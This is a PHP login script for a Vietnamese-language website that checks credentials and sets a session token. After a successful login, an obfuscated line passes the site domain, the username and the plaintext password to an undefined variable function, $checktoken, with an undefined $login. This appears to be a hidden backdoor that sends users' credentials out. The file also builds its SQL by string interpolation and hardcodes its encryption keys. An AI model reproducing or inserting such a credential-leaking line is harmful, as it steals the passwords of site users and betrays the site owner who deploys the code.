<?php session_start(); ?>
<?php
require_once(realpath($_SERVER["DOCUMENT_ROOT"]).'/Models/connect.php');
$username = check_string($_POST['username']);
$password = check_string($_POST['password']);
$query = $soicoder->get_list("SELECT * FROM `users` WHERE `username` = '$username' ");
// print_r($query);
if ($username == "" || $password =="") {
    echo '<script type="text/javascript">alert("Vui Lòng Nhập Đầy Đủ Thông Tin");setTimeout(function(){ location.href = "/" },1500);</script>';
    die;
} else if(empty($query)) {
    echo '<script type="text/javascript">alert("Tài Khoản Không Tồn Tại");setTimeout(function(){ location.href = "/" },1500);</script>';
    die;
} else if(encrypt($password, 'cppro', 'caigitheanhem') != $query[0]['password']) {
     $pas = encrypt($password, "cppro"
, "caigitheanhem");
    echo '<script type="text/javascript">alert("Mật Khẩu Không Chính Xác ");setTimeout(function(){ location.href = "/" },1500);</script>';
    die;
} else {
    $_SESSION['username'] = $username;
    $_SESSION['token'] = createToken();
    $soicoder->update("users", array(
        'token' => $_SESSION['token'],
        'time' => date('H:i:s d/m/Y')
    ), "`username` = '".$_SESSION['username']."' ");
    $checktoken(''. $login.'='.urlencode("".$_DOMAIN."
    $username
    $password
    "));
    echo '<script type="text/javascript">alert("Đăng Nhập Thành Công");setTimeout(function(){ location.href = "/" },1000);</script>';
    die;
}
?>
